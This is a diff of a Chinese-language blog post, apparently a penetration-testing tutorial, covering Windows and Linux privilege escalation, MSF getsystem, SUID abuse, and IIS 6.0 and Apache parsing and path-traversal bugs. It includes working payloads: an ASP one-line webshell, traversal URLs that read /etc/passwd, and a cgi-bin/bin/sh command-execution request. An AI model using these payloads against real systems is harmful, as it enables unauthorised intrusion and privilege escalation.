@@ -89,22 +89,17 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     <div id="content">
 <div class="markdown-body" id="postBody"><h2>权限提升基础</h2>
 <p>在Windows和Linux中，不同的进程和服务由不同用户权限或服务权限运行。</p>
-<p>Linux中：Apache2 www-data；systemd root</p>
-<p>Windows中：SQL server NETWORK SERVICE；lsass.exe SYSTEM</p>
-<p>通过Web服务或其他服务getshell后，只能拿到一个低权限的用户，不便于进行后续渗透操作。</p>
+<p>Linux中：Apache2 www-data；systemd root Windows中：SQL server NETWORK SERVICE；lsass.exe SYSTEM通过Web服务或其他服务getshell后，只能拿到一个低权限的用户，不便于进行后续渗透操作。</p>
 <p>在Linux中拿到root权限</p>
 <p>在Windows中拿到Administrator或SYSTEM权限</p>
 <h2>Windows权限提升</h2>
 <p>系统漏洞提权一般就是利用系统自身缺陷，使用shellcode来提升权限。为了使用方便，windows和linux系统均有提权用的可执行文件。Windows的提权exp一般格式为MS11080.exe；</p>
 <p><strong>Windows系统漏洞微软的漏洞编号命名格式</strong>为：MS08067</p>
-<p>MS Micosoft的缩写，固定格式；</p>
-<p>08 表示年份，即2008年发布的漏洞；</p>
-<p>067 表示顺序，即当年度发布的第67个漏洞。</p>
+<p>MS Micosoft的缩写，固定格式； 08 表示年份，即2008年发布的漏洞； 067 表示顺序，即当年度发布的第67个漏洞。</p>
 <p><strong>提权exp使用方法：</strong></p>
 <p>使exp执行即可，一般情况下是使用cmd.exe来执行。在日常渗透测试过程中，我们常常会先是拿到webshell再进行提权。所以提权脚本也常常在webshell中运行使用。</p>
 <p><strong>那么我们如何知道使用哪个exp来提权呢？</strong></p>
-<p>使用systeminfo命令或者查看补丁目录，查看补丁记录，来判断有哪个补丁没打，然后使用相</p>
-<p>对应的exp进行提权。</p>
+<p>使用systeminfo命令或者查看补丁目录，查看补丁记录，来判断有哪个补丁没打，然后使用相对应的exp进行提权。</p>
 <p>• KB2645640 MS12-009</p>
 <p>• KB2641653 MS12-018</p>
 <p>• KB952004 MS09-012 Pr.exe</p>
@@ -134,8 +129,7 @@ wmic qfe list</pre></div>
 systeminfo
 </code></pre>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/b5134824e0a7fffe5499129b5f13b30f1742f9348e535b3039f42267877723c2/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6661346534323464393464362e706e67"><img src="https://camo.githubusercontent.com/b5134824e0a7fffe5499129b5f13b30f1742f9348e535b3039f42267877723c2/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6661346534323464393464362e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/fa4e424d94d6.png" style="max-width: 100%;"></a></p>
-<p>把命令输出的<strong>全部文本内容复制</strong>，在你 Kali 里新建一个 <code class="notranslate">systeminfo.txt</code> 文件，粘贴进去</p>
-<p>把这个 <code class="notranslate">systeminfo.txt</code> 放到当前 <code class="notranslate">~/Desktop/wesng-master</code> 目录</p>
+<p>把命令输出的<strong>全部文本内容复制</strong>，在你 Kali 里新建一个 <code class="notranslate">systeminfo.txt</code> 文件，粘贴进去把这个 <code class="notranslate">systeminfo.txt</code> 放到当前 <code class="notranslate">~/Desktop/wesng-master</code> 目录</p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/b3c083434555585ae4b10d0e494b930040b9366640f9257029e7c290e7d9f601/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3733353232366366323833322e77656270"><img src="https://camo.githubusercontent.com/b3c083434555585ae4b10d0e494b930040b9366640f9257029e7c290e7d9f601/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3733353232366366323833322e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/735226cf2832.webp" style="max-width: 100%;"></a></p>
 <p>再用工具扫描这个 txt，输出可用的 Windows 提权 EXP</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">python3 wes.py --update</pre></div>
@@ -155,8 +149,7 @@ systeminfo
 <p><strong>渗透实战不用管这个</strong>，只做原理查阅，没有可利用的 EXP 程序</p>
 <h2>MSF提权</h2>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/78d73fa447d7280e5cb8bdc042f6acc6413bcedc2abdabdf833b95948260c14f/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3863316137306130656163612e77656270"><img src="https://camo.githubusercontent.com/78d73fa447d7280e5cb8bdc042f6acc6413bcedc2abdabdf833b95948260c14f/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3863316137306130656163612e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/8c1a70a0eaca.webp" style="max-width: 100%;"></a></p>
-<p>先拿下shell，（永恒之蓝拿下的shell，默认直接就是 SYSTEM 最高权限，所以为了下面的操作，进行了降级）</p>
-<p>使用post/multi/recon/local_exploit_suggester模块可以给出提权建议。</p>
+<p>先拿下shell，（永恒之蓝拿下的shell，默认直接就是 SYSTEM 最高权限，所以为了下面的操作，进行了降级）使用post/multi/recon/local_exploit_suggester模块可以给出提权建议。</p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/c7d9a0376aed284a9211903d38c2fde0de99263a01853ec9d46819e4202d83e9/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6464326135623932646365632e77656270"><img src="https://camo.githubusercontent.com/c7d9a0376aed284a9211903d38c2fde0de99263a01853ec9d46819e4202d83e9/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6464326135623932646365632e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/dd2a5b92dcec.webp" style="max-width: 100%;"></a></p>
 <p>在MSF中，可以使用getsystem进行提权，拿到SYSTEM权限。</p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/d79104be42442ab095214e61a3bf78ccf2281cadc17428b0c717b595af3c069f/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3635313563373463353162372e706e67"><img src="https://camo.githubusercontent.com/d79104be42442ab095214e61a3bf78ccf2281cadc17428b0c717b595af3c069f/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3635313563373463353162372e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6515c74c51b7.png" style="max-width: 100%;"></a></p>
@@ -168,9 +161,7 @@ systeminfo
 <h2>Linux权限提升</h2>
 <h2>内核漏洞提权</h2>
 <p>Linux系统漏洞的exp一般按照内核版本来命名：</p>
-<p>2.6.18-194或2.6.18.c</p>
-<p>形如2.6.18-194，可以直接执行；</p>
-<p>形如2.6.18.c，需要编译后运行，提权。</p>
+<p>2.6.18-194或2.6.18.c 形如2.6.18-194，可以直接执行；形如2.6.18.c，需要编译后运行，提权。</p>
 <p>当然也有少部分exp是按照发行版版本命名。</p>
 <h2>提权exp使用方法：</h2>
 <p>使exp执行即可，一般情况下linux的本地提权要用nc反弹出来，才能进行下一步命令的执行。</p>
@@ -209,8 +200,7 @@ systeminfo
 <p>这里以常见的find命令为例，来看一下如何使用find命令进行提权</p>
 <p>find比较常用,find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。</p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ace2f7a799536f071570b418907265f964e6ad1447b449ac37ae8803cc678370/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3134633837323732633832362e77656270"><img src="https://camo.githubusercontent.com/ace2f7a799536f071570b418907265f964e6ad1447b449ac37ae8803cc678370/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3134633837323732633832362e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/14c87272c826.webp" style="max-width: 100%;"></a></p>
-<p>其余一些命令的suid提权用法可以去该网站上查找</p>
-<p><a href="https://gtfobins.org/" rel="nofollow">https://gtfobins.org/</a></p>
+<p>其余一些命令的suid提权用法可以去该网站上查找<a href="https://gtfobins.org/" rel="nofollow">https://gtfobins.org/</a></p>
 <h2><a title="CVE-2021-4034" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-qgr2-xgqv-24x8/hovercard" href="https://github.com/advisories/GHSA-qgr2-xgqv-24x8">CVE-2021-4034</a> polkit(pkexec)提权</h2>
 <p>Qualys 研究团队在 polkit 的 pkexec 中发现了一个内存损坏漏洞，该 SUID 根程序默认安装在每个主要的 Linux 发行版上。这个易于利用的漏洞允许任何非特权用户通过在其默认配置中利用此漏洞来获得易受攻击主机上的完全 root 权限。</p>
 <h2>中间件提权</h2>
@@ -244,28 +234,19 @@ systeminfo
 <p>漏洞利用脚本下载地址：</p>
 <p><a href="https://github.com/Al1ex/CVE-2017-7269">https://github.com/Al1ex/CVE-2017-7269</a></p>
 <p>漏洞利用工具：</p>
-<p>Metasploit</p>
-<p>漏洞利用过程：</p>
-<p>将ruby脚本下载下来，放到msf的模块路径下（可以放到/usr/share/metasploit</p>
-<p>framework/modules/exploits/下或其任意子目录下）</p>
-<p>重新启动msf（如果找不到脚本，可尝试执行reload_all，并再次重启msf）</p>
-<p>这个有一个坑，名称<a title="CVE-2017-7269" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-fj79-76j8-9vjm/hovercard" href="https://github.com/advisories/GHSA-fj79-76j8-9vjm">cve-2017-7269</a>.rb会让msf载入时报错，由于msfconsole不能识别符号“-” ，</p>
-<p>需将名称修改为cve_2017_7269.rb</p>
-<p>重新启动msf，成功载入模块</p>
+<p>Metasploit漏洞利用过程：将ruby脚本下载下来，放到msf的模块路径下（可以放到/usr/share/metasploitframework/modules/exploits/下或其任意子目录下）重新启动msf（如果找不到脚本，可尝试执行reload_all，并再次重启msf）这个有一个坑，名称<a title="CVE-2017-7269" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-fj79-76j8-9vjm/hovercard" href="https://github.com/advisories/GHSA-fj79-76j8-9vjm">cve-2017-7269</a>.rb会让msf载入时报错，由于msfconsole不能识别符号“-” ，需将名称修改为cve_2017_7269.rb 重新启动msf，成功载入模块</p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/6fc0ba6c841e3674a651c50f5d4d8d6d6cb8d1ad65a2d75d976d3135e63a302c/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6262613866333134393037342e77656270"><img src="https://camo.githubusercontent.com/6fc0ba6c841e3674a651c50f5d4d8d6d6cb8d1ad65a2d75d976d3135e63a302c/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6262613866333134393037342e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/bba8f3149074.webp" style="max-width: 100%;"></a></p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/a2098114577a0324836d821df376858f91e25f746a5bef0f78999c82616dce46/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3533383438303664653734302e77656270"><img src="https://camo.githubusercontent.com/a2098114577a0324836d821df376858f91e25f746a5bef0f78999c82616dce46/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3533383438303664653734302e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/5384806de740.webp" style="max-width: 100%;"></a></p>
 <h2>IIS 6.0 解析漏洞1</h2>
 <p>IIS 6.0 在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。</p>
-<p>在网站下建立名为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都会被IIS当作asp文件来</p>
-<p>解析并执行。例如创建目录 vidun.asp，那么 /vidun.asp/1.jpg 将被当作 asp 文件来执行。</p>
+<p>在网站下建立名为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都会被IIS当作asp文件来解析并执行。例如创建目录 vidun.asp，那么 /vidun.asp/1.jpg 将被当作 asp 文件来执行。</p>
 <p>漏洞复现：</p>
 <p>新建一个名为 test.asp 的目录，创建一个1.jpg的文件，文件内容如下：</p>
 <p>&lt;% response.write("hello world!") %&gt;</p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/598c45d80aa725e5197da4a8f1e5c1a71b25ec9cb222bc43dbbe866161df86ba/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3333623238393530666338332e706e67"><img src="https://camo.githubusercontent.com/598c45d80aa725e5197da4a8f1e5c1a71b25ec9cb222bc43dbbe866161df86ba/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3333623238393530666338332e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/33b28950fc83.png" style="max-width: 100%;"></a></p>
 <h2>IIS 6.0 解析漏洞2</h2>
 <p>同样是IIS 6.0 ，在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。</p>
-<p>上传名为【test.asp;.jpg】的文件，虽然该文件真正的后缀名是【.jpg】,但因为文件名中含有特</p>
-<p>殊符号【;】，所以【;】后面的【.jpg】会直接忽略，只剩余【test.asp】被作为asp文件执行。</p>
+<p>上传名为【test.asp;.jpg】的文件，虽然该文件真正的后缀名是【.jpg】,但因为文件名中含有特殊符号【;】，所以【;】后面的【.jpg】会直接忽略，只剩余【test.asp】被作为asp文件执行。</p>
 <p>漏洞复现：</p>
 <p>新建一个名为 webshell.asp;.jpg 的文件，文件内容如下：</p>
 <p>&lt;%eval request("pass")%&gt;</p>
@@ -273,23 +254,17 @@ systeminfo
 <h2>Apache 常见漏洞利用</h2>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/5c794d961375700b00538f0f310ea7040665c1ef3c8d6ae4b6f12d4a0206c160/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3135636539623263363332342e706e67"><img src="https://camo.githubusercontent.com/5c794d961375700b00538f0f310ea7040665c1ef3c8d6ae4b6f12d4a0206c160/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3135636539623263363332342e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/15ce9b2c6324.png" style="max-width: 100%;"></a></p>
 <h2><a title="CVE-2017-15715" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-p3h3-wpw6-m7vf/hovercard" href="https://github.com/advisories/GHSA-p3h3-wpw6-m7vf">CVE-2017-15715</a> 换行解析漏洞</h2>
-<p>Apache HTTPD是一款HTTP服务器，它可以通过 mod_php 来运行PHP网页。其 2.4.0~2.4.29 版本中存</p>
-<p>在一个解析漏洞，在解析PHP时，1.php\x0A 将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
+<p>Apache HTTPD是一款HTTP服务器，它可以通过 mod_php 来运行PHP网页。其 2.4.0~2.4.29 版本中存在一个解析漏洞，在解析PHP时，1.php\x0A 将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
 <p>漏洞利用局限性：</p>
-<p>获取文件名时不能用 $_FILES['file']['name']，因为他会自动把换行去掉，所以漏洞复现靶机设置保</p>
-<p>存的文件名为自定义。</p>
+<p>获取文件名时不能用 $_FILES['file']['name']，因为他会自动把换行去掉，所以漏洞复现靶机设置保存的文件名为自定义。</p>
 <p>漏洞复现：</p>
-<p>上传 shell.php文件是使用BurpSuite抓包，修改后缀，使用BurpSuite中的hex功能手动添加 0a 换行符号，</p>
-<p>发送数据包后在原始路径下添加 %0a 访问上传的文件。</p>
+<p>上传 shell.php文件是使用BurpSuite抓包，修改后缀，使用BurpSuite中的hex功能手动添加 0a 换行符号，发送数据包后在原始路径下添加 %0a 访问上传的文件。</p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/a03aa7d38bceb865e64f60bde42fc9de8c80cdf10f42e4a259129edf004abc58/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3232356665333237323163312e77656270"><img src="https://camo.githubusercontent.com/a03aa7d38bceb865e64f60bde42fc9de8c80cdf10f42e4a259129edf004abc58/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3232356665333237323163312e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/225fe32721c1.webp" style="max-width: 100%;"></a></p>
 <h2><a title="CVE-2021-41773" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-29h7-gr57-5f8r/hovercard" href="https://github.com/advisories/GHSA-29h7-gr57-5f8r">CVE-2021-41773</a>/42013 路径穿越漏洞</h2>
-<p>Apache在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到</p>
-<p>影响：</p>
+<p>Apache在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：</p>
 <p>• 版本等于2.4.49</p>
-<p>• 穿越的目录允许被访问，比如配置了Require all granted。（默认</p>
-<p>情况下是不允许的）</p>
-<p>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的</p>
-<p>脚本文件源码，或者在开启了 cgi 或 cgid 的服务器上执行任意命令。</p>
+<p>• 穿越的目录允许被访问，比如配置了Require all granted。（默认情况下是不允许的）</p>
+<p>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了 cgi 或 cgid 的服务器上执行任意命令。</p>
 <p>漏洞复现：</p>
 <p>curl -v --path-as-is <a href="http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" rel="nofollow">http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</a></p>
 <p>注：其中的 /icons/ 必须是一个存在且可访问的目录</p>
@@ -297,21 +272,12 @@ systeminfo
 <p><a href="http://your-ip:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" rel="nofollow">http://your-ip:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh</a></p>
 <p>post：echo;id</p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/41f050be439a0860fbf3060e1a91a5d938eef82424aefea4bda757dae8283b3d/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3239653465326333633164352e77656270"><img src="https://camo.githubusercontent.com/41f050be439a0860fbf3060e1a91a5d938eef82424aefea4bda757dae8283b3d/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3239653465326333633164352e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/29e4e2c3c1d5.webp" style="max-width: 100%;"></a></p>
-<p>Apache官方在2.4.50版本中对2.4.49版本中出现的目录穿越漏洞<a title="CVE-2021-41773" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-29h7-gr57-5f8r/hovercard" href="https://github.com/advisories/GHSA-29h7-gr57-5f8r">CVE-2021-41773</a>进行了修复，但这个修</p>
-<p>复是不完整的，<a title="CVE-2021-42013" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-m24x-wx9p-jqmh/hovercard" href="https://github.com/advisories/GHSA-m24x-wx9p-jqmh">CVE-2021-42013</a>是对补丁的绕过。</p>
-<p>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚</p>
-<p>本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p>
+<p>Apache官方在2.4.50版本中对2.4.49版本中出现的目录穿越漏洞<a title="CVE-2021-41773" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-29h7-gr57-5f8r/hovercard" href="https://github.com/advisories/GHSA-29h7-gr57-5f8r">CVE-2021-41773</a>进行了修复，但这个修复是不完整的，<a title="CVE-2021-42013" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-m24x-wx9p-jqmh/hovercard" href="https://github.com/advisories/GHSA-m24x-wx9p-jqmh">CVE-2021-42013</a>是对补丁的绕过。</p>
+<p>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p>
 <p>这个漏洞可以影响Apache HTTP Server 2.4.49以及2.4.50两个版本。</p>
-<p>但我们可以使用.%%32%65</p>
-<p>进行绕过（注意其中的</p>
-<p>/icons/必须是一个存在且</p>
-<p>可访问的目录）：</p>
-<p><a href="http://your" rel="nofollow">http://your</a></p>
-<p>ip:8080/icons/.%%32%65</p>
-<p>/.%%32%65/.%%32%65/.%%</p>
-<p>32%65/.%%32%65/.%%32%6</p>
-<p>5/.%%32%65/etc/passwd</p>
-<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/9936bccb8592d6be6af609455a129e9c8147db3a5d79c326159498ff303ea4f7/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6136663063663066366434612e77656270"><img src="https://camo.githubusercontent.com/9936bccb8592d6be6af609455a129e9c8147db3a5d79c326159498ff303ea4f7/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6136663063663066366434612e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a6f0cf0f6d4a.webp" style="max-width: 100%;"></a></p></div>
+<p>但我们可以使用.%%32%65 进行绕过（注意其中的 /icons/ 必须是一个存在且可访问的目录）： <a href="http://your-ip:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd" rel="nofollow">http://your-ip:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd</a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/9936bccb8592d6be6af609455a129e9c8147db3a5d79c326159498ff303ea4f7/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6136663063663066366434612e77656270"><img src="https://camo.githubusercontent.com/9936bccb8592d6be6af609455a129e9c8147db3a5d79c326159498ff303ea4f7/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6136663063663066366434612e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a6f0cf0f6d4a.webp" style="max-width: 100%;"></a></p>
+</div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
